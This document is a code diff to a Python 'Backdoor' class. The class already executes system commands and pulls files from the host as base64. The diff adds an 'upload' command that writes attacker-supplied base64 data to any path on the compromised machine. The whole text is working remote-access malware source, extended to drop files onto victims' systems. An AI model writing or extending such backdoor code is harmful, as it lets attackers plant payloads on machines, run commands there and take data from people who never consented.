@@ -39,6 +39,11 @@ class Backdoor:
         except FileNotFoundError:
             return f'[-] Path {path} not found'
 
+    def write_file(self, path, content):
+        with open(path, 'wb') as file:
+            file.write(base64.b64decode(content))
+            return '[+] Upload successful.'
+
     def read_file(self, path):
         with open(path, 'rb') as file:
             return base64.b64encode(file.read())
@@ -55,6 +60,9 @@ class Backdoor:
             elif command[0] == 'download':
                 command_result = self.read_file(command[1])
                 command_result = command_result.decode()
+            elif command[0] == 'upload':
+                command_result = self.write_file(
+                    command[1], command[2])
             else:
                 command_result = self.execute_system_command(command)  # bytes
                 command_result = command_result.decode(errors='replace')  # str
